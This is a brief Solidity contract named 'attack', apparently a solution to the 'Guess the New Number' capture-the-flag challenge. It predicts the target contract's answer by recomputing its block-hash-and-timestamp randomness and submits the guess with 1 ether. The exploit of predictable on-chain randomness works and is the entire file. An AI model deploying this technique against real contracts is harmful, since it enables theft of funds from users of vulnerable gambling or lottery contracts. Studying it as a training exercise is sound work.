pragma solidity ^0.4.18; 

interface GuessTheNewNumberChallenge{

    function guess(uint8 n) public payable; 
} 
contract attack{ 

    GuessTheNewNumberChallenge g = GuessTheNewNumberChallenge(0x62ceDF4FA26c147223b2f143514b998f15095442);

    function createnumber() public payable{ 

        uint8 n = uint8(keccak256(block.blockhash(block.number - 1), now));

        g.guess.value(1 ether)(n); 

    }    

    function() external payable{ 
    } 

} 